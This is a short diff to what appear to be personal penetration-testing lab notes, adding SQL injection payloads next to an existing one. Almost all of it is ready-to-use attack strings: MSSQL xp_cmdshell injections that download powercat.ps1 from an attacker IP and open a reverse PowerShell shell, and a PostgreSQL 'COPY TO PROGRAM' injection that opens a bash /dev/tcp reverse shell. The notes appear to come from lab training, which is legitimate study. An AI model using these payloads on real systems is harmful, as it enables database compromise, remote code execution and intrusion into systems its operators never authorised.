@@ -117,3 +117,8 @@ Apache 2.4.49. This vulnerability can be exploited by using a relative path afte
 
 special note s for time based blind cmd:
 offsec1';+EXEC xp_cmdshell 'powershell -Command "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.45.248:8000/powercat.ps1''); powercat -c 192.168.45.248 -p 4444 -e powershell"';--
+
+error based sql postgrel reverse shell cmd:
+170' order by 6;COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.248/4444 0>&1"'; 
+
+EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "& { IEX (New-Object Net.WebClient).DownloadString(''http://192.168.45.248:8000/powercat.ps1'') powercat -c 192.168.45.248 -p 4444 -e powershell }"';
